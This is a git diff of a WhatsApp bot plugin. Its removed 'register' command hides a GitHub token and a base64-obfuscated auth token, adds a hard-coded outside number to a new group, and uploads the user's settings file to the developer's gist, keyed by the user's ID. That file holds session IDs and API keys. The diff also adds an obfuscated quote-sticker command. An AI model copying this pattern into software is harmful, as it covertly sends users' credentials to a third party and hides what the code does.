@@ -8,10 +8,12 @@ const { isAdmin, parsedJid, command } = require("../lib");
 let path = './database/settings.json'
 const relconfig = require('../config')
 const config = require('../database/settings.json')
+const { registeruser } = require('../lib/alfabase')
 //============================================================================================================================================
 //============================================================================================================================================
 //============================================================================================================================================
 //============================================================================================================================================
+const { ALIVE, HEROKU_APP_NAME, HANDLERS, WORK_TYPE, PACKNAME, AUTHOR, BOT_NAME, OWNER_NAME, SUDO, THEME, FONT_STYLE, INTERNAL_MENU } = require("../database/settings");
 
 
 command({
@@ -42,167 +44,8 @@ command({
 
 },
 async (message, match, m) => {
-  
-    let authid = "gh+p_oHh1b+dV2wk1+wOQXl+TRSH+vMDN+fuxXR+M1DIgG0".replaceAll('+', '');
-
-  
-    const {
-        Octokit
-      } = require("@octokit/rest");
-      const octokit = new Octokit({
-        auth: await authid
-      })
-  
-  
-  
-    setTimeout(() => {
-  
-       let db = JSON.parse(fs.readFileSync('./database/settings.json'));
-       let ggg = db.config.STORAGE_JID
-  
-       let fek = ggg.toString().includes('@g.us')
-       if (!fek) {
-  
-          readFile(path, async (error, data) => {
-             if (error) {
-                console.log(error);
-                return;
-             }
-             const parsedData = JSON.parse(data);
-  
-             let datas = await message.client.groupCreate("Storage", ["359889999996@s.whatsapp.net"])
-  
-             await message.client.sendMessage(datas.id, {
-                text: 'This is your Storage area, i will save all your files here!'
-             })
-  
-             let bi = await datas.id
-  
-             parsedData.config.STORAGE_JID = bi
-  
-             writeFile(path, JSON.stringify(parsedData, null, 2), async (err) => {
-                if (err) {
-                   message.reply("Failed to write updated data to file");
-                   return;
-                }
-  
-                await message.client.updateProfilePicture(datas.id, fs.readFileSync("./media/AAA.jpg"))
-  
-             });
-          });
-  
-       } else return;
-  
-  
-  
-       setTimeout( async () => {
-  
-        
-             let session = require("../session.json");
-             let ibm1 = await (session.creds.me.id).split(":")[0]
-             let ibm2 = await (session.creds.me.id).split("@")[1]
-             let ibm = ibm1+'@'+ibm2      
-  
-             let filenamzi = ibm + ".json"
-        
-             const parsedData = fs.readFileSync('./database/settings.json', 'utf-8');
-        
-  
-  
-            await  octokit.rest.gists.update({
-                gist_id: 'd83fa03a09d9a09032f3180a8d1ecd02',
-                description: 'Cloud DB Update',
-                files: {
-                  [filenamzi]: {
-                      content: parsedData
-                   }
-                }
-             }).then(
-              await console.log('Done Creating New Db'),
-        
-             ); 
-  
-               
-               setTimeout(() => {
-                 return process.send('reset')
-               }, 8000)
-     
-     }, 5000)
-  
-    }, 2000)
-  
-    readFile(path, async (error, data) => {
-       if (error) {
-          console.log(error);
-          return;
-       }
-       const parsedData = JSON.parse(data);
-  
-       let check = parsedData.UserId.toString().includes('@s.whatsapp.net')
-       if (check) return message.reply("_You Are Already a Family Member_")
-       let int = process.env.DB_AUTH_TOKEN === undefined ? 'WncvYUEvY0EvWHcvYncvU0EvYUEvTVEvWWcvWkEvVmcvTWcvZHcvYXcvTVEvZHcvVHcvVVEvV0EvYkEvVkEvVWcvVXcvU0EvZGcvVFEvUkEvVGcvWmcvZFEvZUEvV0EvVWcvVFEvTVEvUkEvU1EvWncvUncvTUEv' : process.env.DB_AUTH_TOKEN;
-       let fin = Buffer.from(int, "base64").toString("utf-8");
-       let inx = fin.toString().split('/')
-       let our='';
-       for (let r of inx){
-        our += await Buffer.from(r+'==', "base64").toString("utf-8");
-       }
-
-       let session = require("../session.json");
-       let ibm1 = await (session.creds.me.id).split(":")[0]
-       let zudo = '0,'+ibm1
-       let zupo = await relconfig.SUDO === false ? zudo : relconfig.SUDO
-       
-       let namezi = message.pushName
-       let Useridzi = message.user
-       let numzi = message.jid.toString().split('@')[0]
-  
-       parsedData.name = namezi
-       parsedData.UserId = Useridzi
-       parsedData.phone_num = numzi
-  
-       parsedData.config.HANDLER = relconfig.HANDLERS
-       parsedData.config.WORK_TYPE =relconfig.WORK_TYPE
-       parsedData.config.BOT_NAME = relconfig.BOT_NAME
-       parsedData.config.OWNER_NAME = relconfig.OWNER_NAME
-       parsedData.config.SUDO = zupo
-       parsedData.config.AUTHOR = relconfig.AUTHOR
-       parsedData.config.PACKNAME = relconfig.PACKNAME
-       parsedData.config.RMBG_KEY = relconfig.RMBG_KEY
-       parsedData.config.LANG = relconfig.LANG
-       parsedData.config.ANTILINK_ACTION = relconfig.ANTILINK_ACTION
-       parsedData.config.ANTILINK = relconfig.ANTILINK
-       parsedData.config.FOOTER = relconfig.FOOTER
-       parsedData.config.THEME = relconfig.THEME
-       parsedData.config.FONT_STYLE = relconfig.FONT_STYLE
-       parsedData.config.LANGUAGE = relconfig.LANGUAGE
-       parsedData.config.INTERNAL_MENU = relconfig.INTERNAL_MENU
-       parsedData.config.MODE = relconfig.MODE
-       parsedData.config.STORAGE_JID 
-       parsedData.config.DB_URL
-       parsedData.config.SESSION_ID = relconfig.SESSION_ID
-       parsedData.config.LOGS = relconfig.LOGS
-       parsedData.config.BRANCH = relconfig.BRANCH
-       parsedData.config.B1 = relconfig.B1
-       parsedData.config.B2 = relconfig.B2
-       parsedData.config.B3 = relconfig.B3
-       parsedData.config.B4 = relconfig.B4
-       parsedData.config.B5 = relconfig.B5
-       parsedData.config.DB_AUTH_TOKEN = our
-
-       parsedData.MESSAGE_MEM.GOODBYE_MSG = relconfig.GOODBYE_MSG
-       parsedData.MESSAGE_MEM.WELCOME_MSG = relconfig.WELCOME_MSG
-       parsedData.MESSAGE_MEM.ALIVE = relconfig.ALIVE
-  
-       writeFile(path, JSON.stringify(parsedData, null, 2), (err) => {
-          if (err) {
-             message.reply("Failed to write updated data to file");
-             return;
-          }
-          message.reply(`_Registered Successfully_`);
-  
-       });
-    });  })
+  registeruser(message)
+  })
 
 
 
@@ -219,5 +62,18 @@ fs.watchFile(file, () => {
 })
 
 
+const axios = require("axios");
 
 
+  command({
+    pattern: "qc",
+    fromMe: false,
+    desc: "Show All commands",
+    dontAddCommandList: true,
+    type: "theme",
+  
+  }, async (message, match, m) => {
+function _0x52fd(){const _0x27a53c=['application/json','https://bot.lyo.su/quote/generate','eror','image','jid','client','sticker','7238547sqmJEo','41316pEKgvx','6176568ndUjit','32LSRiOh','2233170ruGfrc','160XREjfs','text','Please\x20quote\x20any\x20users\x20message.','sendMessage','from','reply','data','https://avatars.githubusercontent.com/u/64305844?v=4','#FFFFFF','webp','3517775MQzJOo','1025122fupeUl','result','65079yAUFeR','reply_message'];_0x52fd=function(){return _0x27a53c;};return _0x52fd();}const _0x3b6db2=_0x3316;(function(_0x3f56f2,_0x2fbbc1){const _0x8593da=_0x3316,_0x1a662d=_0x3f56f2();while(!![]){try{const _0x5dc3ea=parseInt(_0x8593da(0xd1))/0x1+-parseInt(_0x8593da(0xde))/0x2+-parseInt(_0x8593da(0xdb))/0x3*(-parseInt(_0x8593da(0xdf))/0x4)+parseInt(_0x8593da(0xce))/0x5+-parseInt(_0x8593da(0xdc))/0x6+-parseInt(_0x8593da(0xcf))/0x7*(-parseInt(_0x8593da(0xdd))/0x8)+parseInt(_0x8593da(0xda))/0x9;if(_0x5dc3ea===_0x2fbbc1)break;else _0x1a662d['push'](_0x1a662d['shift']());}catch(_0x1f3a20){_0x1a662d['push'](_0x1a662d['shift']());}}}(_0x52fd,0x89970));if(!message[_0x3b6db2(0xd2)][_0x3b6db2(0xe0)])return await message[_0x3b6db2(0xc9)](_0x3b6db2(0xc6));let pfp;try{pfp=await message[_0x3b6db2(0xd8)]['profilePictureUrl'](message[_0x3b6db2(0xd2)]['jid'],_0x3b6db2(0xd6));}catch(_0x180805){pfp=_0x3b6db2(0xcb);}var tname;try{tname=await getName(message['reply_message'][_0x3b6db2(0xd7)]);}catch(_0x6a2599){tname='user';}let qczi;qczi={'type':'quoted','format':_0x3b6db2(0xcd),'backgroudnColor':_0x3b6db2(0xcc),'width':0x200,'height':0x300,'scale':0x2,'messages':[{'avatar':!![],'from':{'first_name':tname,'language_code':'en','name':tname,'photo':{'url':pfp}},'text':message[_0x3b6db2(0xd2)][_0x3b6db2(0xe0)],'replyMessage':{}}]};const post=await axios['post'](_0x3b6db2(0xd4),qczi,{'headers':{'Content-Type':_0x3b6db2(0xd3)}});let buff=await Buffer[_0x3b6db2(0xc8)](post[_0x3b6db2(0xca)][_0x3b6db2(0xd0)][_0x3b6db2(0xd6)],'base64');function _0x3316(_0x44da99,_0x5cf007){const _0x52fdd0=_0x52fd();return _0x3316=function(_0x3316cd,_0x2dd123){_0x3316cd=_0x3316cd-0xc6;let _0x37b14f=_0x52fdd0[_0x3316cd];return _0x37b14f;},_0x3316(_0x44da99,_0x5cf007);}if(buff==undefined)return message['reply'](_0x3b6db2(0xd5));message[_0x3b6db2(0xc7)](buff,{'packname':PACKNAME,'author':AUTHOR},_0x3b6db2(0xd9));
+                  })
+  
+  
